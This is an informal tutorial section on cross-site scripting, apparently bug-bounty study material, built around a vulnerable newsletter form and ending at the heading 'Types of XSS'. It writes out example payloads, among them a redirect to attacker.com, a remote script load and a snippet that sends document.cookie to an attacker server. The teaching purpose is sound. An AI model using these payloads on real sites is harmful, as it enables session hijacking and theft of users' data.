## Cross-Site Scripting

XSS (Cross-site scripting) is one of the most common bugs reported to bug bounty programs. It pretty much constantly shows up in OWASPs list of the top 10 vulnerabilities year after year.

An XSS vuln occurs when attackers can execute a custom script on a victim's browser. If an app can't distinguish between user input and legit code that makes up a web page, the attackers can inject malicious code into pages that'll be viewed by other users. Pretty scary since this means that the victim's browser can execute this script which might steal info, redirect users to malicious sites, etc.

This section will go over what XSS vulns are, how to exploit em, and how to bypass some common protections. Also, we'll discuss how to escalate XSS vulns when you find one.

---

## Mechanisms

In an XSS attack, an executable script is injected into HTML pages. This is where being a web dev comes useful since we know JS and HTML. Thinking about it for more than 5 seconds, the problem child of HTML when it comes to XSS is nothing more than the `<script />` element that HTML files use to allow in-line script execution. Of course, browsers can also load JS via an external file by using the `src` attribute.

Let's look at an example of how this might work in practice.

```
<h1>Welcome to my site.</h1>
<h3>This is a cybersecurity newsletter that focuses on bug bounty
news and write-ups. Please subscribe to my newsletter below to
receive new cybersecurity articles in your email inbox.</h3>
<form action="/subscribe" method="post">
 <label for="email">Email:</label><br>
 <input type="text" id="email" value="Please enter your email.">
 <br><br>
 <input type="submit" value="Submit">
</form>
```

The above is a newsletter page that allows us to enter our email address to subscribe.
When we hit submit, a message will pop up:

```
<p>Thanks! You have subscribed <b>kirbyrules@gmail.com</b> to the newsletter.</p>
```

In this case, the page constructs the above message by using user input to show our email address that we just entered. Now...what if a user decides to input a script instead of an email address in the email form?

```
<script>location="http://attacker.com";</script>
```

If the website doesn't validate or sanitize the user input before constructing the confirmation message, the page's source code would become:

```
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</
script></b> to the newsletter.</p>
```

As a result, the inline script would cause the page to redirect to `attacker.com`. spooky!

XSS happens when attackers can inject scripts in this manner onto a page that another user's viewing. The attacker might also be able to use a different syntax to embed malicious code. Remember how we mentioned we could use the `src` attribute?

```
<script src=http://attacker.com/xss.js></script>
```

This example is interesting, since this example isn't really exploiotable, since attackers have no way of injecting the malicious script onto other users' pages aide from, say, redirecting themselves to a malicious page. BUT. Let's say that the site also allows users to subscribe to the newsletter by visiting a specific URL:

```
 https://subscribe.example.com?email=SUBSCRIBER_EMAIL
```

This is a pretty familiar pattern. In fact, think about how _Unsubscribing_ works. It's pretty standard that clicking the "Unsubscribe" button redirects you to somewhere else, where it then unsubscribes. In this case, attackers can therefore inject the script by tricking users into visiting a malicious email!

```
https://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

Since the malicious script gets incorporated into the page itself, the victim's browser will think that the script is a valid part of that site. The injected script can then access whatever resources that the browser stores for that site, including cookies and session tokens, thus letting attackers use these scripts to steal info and bypass access control. An example of this is that attackers might steal user cookies by making the victim's browser send a request to the attacker's IP with the victim's cookie as a URL param:

```
<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

This script contains JS that'll load an image from the attacker's server, with the attacker's IP being used for a GET request while using the URL param `c` (C for cookie 🍪)containing the user's document.cookie for the current site.

If the session cookie has the `HttpOnly` flag set, however, JS will not be able to read the cookie, which therefore means that the attacker won't be able to exfiltrate it. Regardless, XSS can be used to execute actions on the victim's behalf, modify the web page, and read the victim's sensitive info, usch as CSRF tokens, CC numbers, and anyhting else rendered on their page.

---

## Types of XSS
